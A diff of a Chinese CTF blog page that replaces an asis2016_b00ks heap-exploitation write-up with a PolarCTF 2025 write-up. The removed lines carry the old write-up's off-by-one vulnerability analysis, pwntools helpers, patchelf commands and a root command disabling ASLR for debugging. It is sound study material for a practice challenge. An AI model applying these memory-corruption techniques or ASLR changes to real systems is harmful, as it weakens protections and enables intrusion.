@@ -19,77 +19,55 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"kubansec.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.22.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="序言 题目链接： https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#asis2016_b00ks  2016年的题花了好几天时间才做出来，遂记录一下。通过这道题学习到很多知识点，如off-by-one、钩子函数（malloc_hook和free_hook）的利用，还有就是——当malloc一个接近或超过top_chunk的大小的空间时，程序会使用mmap拓展空间，使得堆以mmap的形式进行扩">
+    <meta name="description" content="序言这是polarctf2025春季个人挑战赛——栈溢出部分，堆系列有两道搞不懂，先放出来这些，后面继续学堆去咯~  题目附件：https:&#x2F;&#x2F;github.com&#x2F;kubansec&#x2F;pwn&#x2F;tree&#x2F;main&#x2F;polarctf2025_Spring">
 <meta property="og:type" content="article">
-<meta property="og:title" content="【buuCTF刷题】asis2016_b00ks">
+<meta property="og:title" content="PolarCTF2025春季个人挑战赛——部分WP">
 <meta property="og:url" content="http://kubansec.github.io/posts/b08e/index.html">
 <meta property="og:site_name" content="Kuban&#39;s blog">
-<meta property="og:description" content="序言 题目链接： https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#asis2016_b00ks  2016年的题花了好几天时间才做出来，遂记录一下。通过这道题学习到很多知识点，如off-by-one、钩子函数（malloc_hook和free_hook）的利用，还有就是——当malloc一个接近或超过top_chunk的大小的空间时，程序会使用mmap拓展空间，使得堆以mmap的形式进行扩">
+<meta property="og:description" content="序言这是polarctf2025春季个人挑战赛——栈溢出部分，堆系列有两道搞不懂，先放出来这些，后面继续学堆去咯~  题目附件：https:&#x2F;&#x2F;github.com&#x2F;kubansec&#x2F;pwn&#x2F;tree&#x2F;main&#x2F;polarctf2025_Spring">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-1.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-2.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-3.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-4.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-5.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-6.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-7.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-9.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-8.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-11.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-12.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-13.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-17.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-15.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-16.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-18.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-19.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-20.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-21.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-22.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-24.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-25.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-26.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-27.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-44.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-45.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-26.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-28.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-29.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-31.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-33.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-34.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-36.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-37.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-38.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-39.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-42.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-41.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-43.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-46.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-50.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-51.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-53.png">
-<meta property="og:image" content="http://kubansec.github.io/Snipaste_2025-02-15_00-09-32.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-54.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-55.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-56.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-57.png">
-<meta property="og:image" content="http://kubansec.github.io/images/p7/image-58.png">
+<meta property="og:image" content="http://kubansec.github.io/image.png">
+<meta property="og:image" content="http://kubansec.github.io/image-2.png">
+<meta property="og:image" content="http://kubansec.github.io/image-6.png">
+<meta property="og:image" content="http://kubansec.github.io/image-3.png">
+<meta property="og:image" content="http://kubansec.github.io/image-7.png">
+<meta property="og:image" content="http://kubansec.github.io/image-8.png">
+<meta property="og:image" content="http://kubansec.github.io/image-9.png">
+<meta property="og:image" content="http://kubansec.github.io/image-11.png">
+<meta property="og:image" content="http://kubansec.github.io/image-10.png">
+<meta property="og:image" content="http://kubansec.github.io/image-12.png">
+<meta property="og:image" content="http://kubansec.github.io/image-13.png">
+<meta property="og:image" content="http://kubansec.github.io/image-14.png">
+<meta property="og:image" content="http://kubansec.github.io/image-15.png">
+<meta property="og:image" content="http://kubansec.github.io/image-18.png">
+<meta property="og:image" content="http://kubansec.github.io/image-20.png">
+<meta property="og:image" content="http://kubansec.github.io/image-21.png">
+<meta property="og:image" content="http://kubansec.github.io/image-23.png">
+<meta property="og:image" content="http://kubansec.github.io/image-22.png">
+<meta property="og:image" content="http://kubansec.github.io/image-25.png">
+<meta property="og:image" content="http://kubansec.github.io/image-26.png">
+<meta property="og:image" content="http://kubansec.github.io/image-29.png">
+<meta property="og:image" content="http://kubansec.github.io/image-24.png">
 <meta property="article:published_time" content="2025-01-26T13:22:34.000Z">
-<meta property="article:modified_time" content="2025-02-16T07:07:03.034Z">
+<meta property="article:modified_time" content="2025-04-08T13:45:32.700Z">
 <meta property="article:author" content="KubanSec">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="PolarCTF">
+<meta property="article:tag" content="koi">
+<meta property="article:tag" content="bllhl_mom">
+<meta property="article:tag" content="bllbl_shellcode_2">
+<meta property="article:tag" content="libc">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://kubansec.github.io/images/p7/image.png">
+<meta name="twitter:image" content="http://kubansec.github.io/image.png">
 
 
 <link rel="canonical" href="http://kubansec.github.io/posts/b08e/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://kubansec.github.io/posts/b08e/","path":"posts/b08e/","title":"【buuCTF刷题】asis2016_b00ks"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://kubansec.github.io/posts/b08e/","path":"posts/b08e/","title":"PolarCTF2025春季个人挑战赛——部分WP"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>【buuCTF刷题】asis2016_b00ks | Kuban's blog</title>
+<title>PolarCTF2025春季个人挑战赛——部分WP | Kuban's blog</title>
   
 
 
@@ -138,7 +116,7 @@
 
 
 <nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">25</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">3</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">9</span></a></li>
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">30</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">3</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">10</span></a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
         </a>
@@ -189,7 +167,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%8F%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">序言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91"><span class="nav-number">2.</span> <span class="nav-text">程序逻辑</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#main-%E5%87%BD%E6%95%B0"><span class="nav-number">3.1.</span> <span class="nav-text">main 函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Create-a-book"><span class="nav-number">3.2.</span> <span class="nav-text">Create a book</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Delete-a-book"><span class="nav-number">3.3.</span> <span class="nav-text">Delete a book</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Change-current-author-name"><span class="nav-number">3.4.</span> <span class="nav-text">Change current author name</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Efit-%E5%92%8C-Print"><span class="nav-number">3.5.</span> <span class="nav-text">Efit 和 Print</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">4.</span> <span class="nav-text">利用思路</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%9B%BF%E6%8D%A2libc"><span class="nav-number">4.1.</span> <span class="nav-text">1.替换libc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E6%B3%84%E9%9C%B2book1-addr"><span class="nav-number">4.2.</span> <span class="nav-text">2.动态调试 &amp;&amp; 泄露book1_addr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-fake-book%E7%9A%84%E6%95%85%E4%BA%8B"><span class="nav-number">4.3.</span> <span class="nav-text">3.fake_book的故事</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="nav-number">4.4.</span> <span class="nav-text">4.泄露libc基地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E9%92%A9%E5%AD%90%E5%92%8Cone-gadget"><span class="nav-number">4.5.</span> <span class="nav-text">5.钩子和one_gadget</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%E6%94%B9%E5%96%84%E3%80%8A4-%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9C%B0%E5%9D%80%E3%80%8B%E7%9A%84payload"><span class="nav-number">4.6.</span> <span class="nav-text">6.改善《4.泄露libc基地址》的payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-%E6%8C%82%E9%92%A9%E5%AD%90"><span class="nav-number">4.7.</span> <span class="nav-text">7.挂钩子</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4EXP"><span class="nav-number">5.</span> <span class="nav-text">完整EXP</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%8F%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">序言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#koi"><span class="nav-number">2.</span> <span class="nav-text">koi</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="nav-number">2.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP"><span class="nav-number">2.2.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#bllhl-mom"><span class="nav-number">3.</span> <span class="nav-text">bllhl_mom</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-1"><span class="nav-number">3.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP-1"><span class="nav-number">3.2.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#libc"><span class="nav-number">4.</span> <span class="nav-text">libc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-2"><span class="nav-number">4.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP-2"><span class="nav-number">4.2.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fmt-text"><span class="nav-number">5.</span> <span class="nav-text">fmt_text</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-3"><span class="nav-number">5.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP-3"><span class="nav-number">5.2.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#bllbl-shellcode-2"><span class="nav-number">6.</span> <span class="nav-text">bllbl_shellcode_2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-4"><span class="nav-number">6.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP-4"><span class="nav-number">6.2.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">7.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -202,7 +180,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-count">10</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -211,7 +189,7 @@
         <span class="site-state-item-name">分类</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-count">30</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
@@ -254,12 +232,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="【buuCTF刷题】asis2016_b00ks | Kuban's blog">
+      <meta itemprop="name" content="PolarCTF2025春季个人挑战赛——部分WP | Kuban's blog">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          【buuCTF刷题】asis2016_b00ks
+          PolarCTF2025春季个人挑战赛——部分WP
         </h1>
 
         <div class="post-meta-container">
@@ -277,7 +255,16 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-02-16 15:07:03" itemprop="dateModified" datetime="2025-02-16T15:07:03+08:00">2025-02-16</time>
+      <time title="修改时间：2025-04-08 21:45:32" itemprop="dateModified" datetime="2025-04-08T21:45:32+08:00">2025-04-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">pwn学习</span></a>
+        </span>
     </span>
 
   
@@ -294,14 +281,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>8.8k</span>
+      <span>5.6k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>8 分钟</span>
+      <span>5 分钟</span>
     </span>
 </div>
 
@@ -311,94 +298,103 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
-<p>题目链接： <span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2FzaXMyMDE2X2IwMGtz">https://buuoj.cn/challenges#asis2016_b00ks<i class="fa fa-external-link-alt"></i></span></p>
+    <div class="post-body" itemprop="articleBody"><h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>这是polarctf2025春季个人挑战赛——栈溢出部分，堆系列有两道搞不懂，先放出来这些，后面继续学堆去咯~</p>
+<blockquote>
+<p>题目附件：<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2t1YmFuc2VjL3B3bi90cmVlL21haW4vcG9sYXJjdGYyMDI1X1NwcmluZw==">https://github.com/kubansec/pwn/tree/main/polarctf2025_Spring<i class="fa fa-external-link-alt"></i></span></p>
 </blockquote>
-<p>2016年的题花了好几天时间才做出来，遂记录一下。<br>通过这道题学习到很多知识点，如off-by-one、钩子函数（malloc_hook和free_hook）的利用，还有就是——当malloc一个接近或超过top_chunk的大小的空间时，程序会使用mmap拓展空间，使得堆以mmap的形式进行扩展，而mmap开辟出的空间与libc基址的偏移是固定的，因此只要拿到mmap开辟出的chunk的地址，就能计算出libc的基地址。</p>
 <span id="more"></span>
 
-
-<h1 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h1><p>进入程序，先输入一个作者名，跳出目录<br><img src="/./images/p7/image.png"></p>
-<p>依次尝试，根据输出预定义一下对应函数</p>
-<ol>
-<li><p>Create a book<br>进入创建要输入name_size , name , des_size , des<br> <img src="/./images/p7/image-1.png"></p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def create(name_size , name , des_size , des):</span><br><span class="line">    io.sendlineafter(&#x27;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;size: &#x27;,str(name_size))</span><br><span class="line">    io.sendlineafter(&#x27;: &#x27;,name)</span><br><span class="line">    io.sendlineafter(&#x27;: &#x27;,str(des_size))</span><br><span class="line">    io.sendlineafter(&#x27;: &#x27;,des)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>Delete a book<br> 删除功能直接输入book_id就可以了，Book_id可以在打印功能中看到<br> <img src="/./images/p7/image-2.png"></p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def delete(book_id):</span><br><span class="line">        io.sendlineafter(&#x27;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">        io.sendlineafter(&#x27;: &#x27;,str(id))</span><br></pre></td></tr></table></figure>
-
-
-
-</li>
-<li><p>Edit a book<br> 编辑功能输入要编辑的Book_id，然后编辑内容<br> <img src="/./images/p7/image-3.png"></p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def edit(book_id,des):</span><br><span class="line">        io.sendlineafter(&#x27;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">        io.sendlineafter(&#x27;: &#x27;,str(book_id))</span><br><span class="line">        io.sendlineafter(&#x27;: &#x27;,des)</span><br></pre></td></tr></table></figure>
-
-</li>
-<li><p>Print book detail<br> 打印所有书的信息，包括作者<br> <img src="/./images/p7/image-4.png"></p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def Print():</span><br><span class="line">        io.sendlineafter(&#x27;&gt; &#x27;,&#x27;4&#x27;)</span><br></pre></td></tr></table></figure>
-
-</li>
-<li><p>Change current author name<br> 切换作者，也是直接输入新作者名就可以<br> <img src="/./images/p7/image-5.png"></p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def change(author):</span><br><span class="line">        io.sendlineafter(&#x27;&gt; &#x27;,&#x27;5&#x27;)</span><br><span class="line">        io.sendlineafter(&#x27;: &#x27;,author)</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h2><p>放入IDA里面，对一些函数进行重命名<br><img src="/./images/p7/image-6.png"><br>先看scanf_author函数，通过前面的运行测试我们能猜出来大概是输入作者名的函数，点进去看到确实是让我们输入作者名<br><img src="/./images/p7/image-7.png"><br>是通过调用scanf_to_ptr的函数输入作者名，并且有两个参数，第一个参数off_202018其实是data段上的一个指针<br><img src="/./images/p7/image-9.png"><br>点进去函数看一下<br><img src="/./images/p7/image-8.png"><br>可以看到，通过循环变量i向off_202018这个指针的地址读入作者名，第二个参数在 i=&#x3D;a2 判断中作为循环终止的条件，注意到i是从0开始变化，如果循环条件是 i&#x3D;&#x3D;a2 ，这个循环实际上会执行33次，就导致作者名的长度是33个字节，有一个字节的溢出。<br><strong>scanf_to_ptr的函数存在off-by-one漏洞</strong></p>
-<h2 id="Create-a-book"><a href="#Create-a-book" class="headerlink" title="Create a book"></a>Create a book</h2><p>首先输入name_size的大小，然后根据size分配书名的堆，并把堆地址给ptr_name。如果堆空间分配成功，则向此堆中写入书名（第21行）<br><img src="/./images/p7/image-11.png"><br>注意写入书名调用的是scanf_to_ptr函数，我们分析过这个函数的功能是向第一个参数对应的空间写入内容，并且这个函数存在off-by-one漏洞。</p>
-<p>同样的操作，再输入desc_size，根据size再分配一个堆给书的内容<br><img src="/./images/p7/image-12.png"><br>如果堆空间分配成功，则调用漏洞函数scanf_to_ptr向堆中写入书的内容</p>
-<p>接下来看这里，分配了一个0x20的空间给一个变量，而这个变量其实存着一个结构体<br><img src="/./images/p7/image-13.png"></p>
-<p>第56、58、59、60行描述了结构体的成员变量，根据这些信息还原一下结构体是这样的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;               </span><br><span class="line">    int id;          </span><br><span class="line">    char *name;                 </span><br><span class="line">    char *description;          </span><br><span class="line">    int description_size; </span><br><span class="line">&#125; Book;</span><br></pre></td></tr></table></figure>
-<p>可以看到，程序用一个结构体去描述图书的信息</p>
-<p>57行将结构体的地址赋给了off_202010指针，而这个地址我们之前见过一次。在main函数的一开始，我们<strong>在off_202018指针指向的地址存放了作者名，在off_202010指针指向的地址存放图书结构体</strong><br><img src="/./images/p7/image-17.png"><br><strong>注意黄色标注的区域，作者名在超过0x20——也就是32个字节后，就会来到off_202010指针所指的空间。我们在前面分析知道，作者名是通过scanf_to_ptr函数读入，而这个函数存在off_by_one漏洞，导致作者名有一个字节的溢出，而这个溢出则会直接覆盖off_202010的第一个低字节。</strong><br>如果我们给作者名输入32个字符，因为字符串是\x00结尾，所以\x00会作为第33个字符溢出到off_202010的第一个低字节。</p>
-<h2 id="Delete-a-book"><a href="#Delete-a-book" class="headerlink" title="Delete a book"></a>Delete a book</h2><p>delete函数通过free释放空间，并且置为0，不存在UAF漏洞<br><img src="/./images/p7/image-15.png"></p>
-<h2 id="Change-current-author-name"><a href="#Change-current-author-name" class="headerlink" title="Change current author name"></a>Change current author name</h2><p>改变作者时，scanf_to_ptr同样是向off_202018的空间读入作者名<br><img src="/./images/p7/image-16.png"></p>
-<h2 id="Efit-和-Print"><a href="#Efit-和-Print" class="headerlink" title="Efit 和 Print"></a>Efit 和 Print</h2><p>这两个函数没什么特殊的<br><img src="/./images/p7/image-18.png"><br><img src="/./images/p7/image-19.png"></p>
-<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><h2 id="1-替换libc"><a href="#1-替换libc" class="headerlink" title="1.替换libc"></a>1.替换libc</h2><p>由于是2016年的题，本地环境很难与远程环境一致，我这里用patchelf换了ubuntu 16的libc和ld，进行动态调试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ~/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64 ./b00ks</span><br><span class="line">patchelf --set-interpreter ~/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so ./b00ks </span><br></pre></td></tr></table></figure>
-<p>ldd验证一下<br><img src="/./images/p7/image-20.png"></p>
-<h2 id="2-动态调试-泄露book1-addr"><a href="#2-动态调试-泄露book1-addr" class="headerlink" title="2.动态调试 &amp;&amp; 泄露book1_addr"></a>2.动态调试 &amp;&amp; 泄露book1_addr</h2><p>在动态调试之前可以先把ASLR保护关掉</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">//重启机器后ASLR保护会自动打开    </span><br></pre></td></tr></table></figure>
-
-<p>gdb r 调试运行程序，输入作者名时输入32个字节<br><img src="/./images/p7/image-21.png"><br>ctrl+c 进入调试<br><img src="/./images/p7/image-22.png"><br>记录起始地址0x555555400000，作者名在偏移off_202018处，定位到作者名地址，<strong>绿框中的\x00其实是作者名溢出的字节</strong><br><img src="/./images/p7/image-24.png"></p>
-<p>按c回到程序中，创建一本书名和内容大小均为10的图书<br><img src="/./images/p7/image-25.png"><br>ctrl+c 进入调试，看看内存布局<br><img src="/./images/p7/image-26.png"><br>发现在作者名后面紧跟上了一个地址，根据静态分析我们推测这个地址指向刚刚创建的图书结构体，跟进去看的确如此<br><img src="/./images/p7/image-27.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x0000555555607460 = 图书结构体 = book1_id</span><br><span class="line">0x0000555555607468 = book1_name</span><br><span class="line">0x0000555555607470 = book1_desc</span><br><span class="line">0x0000555555607478 = book1_desc_size</span><br></pre></td></tr></table></figure>
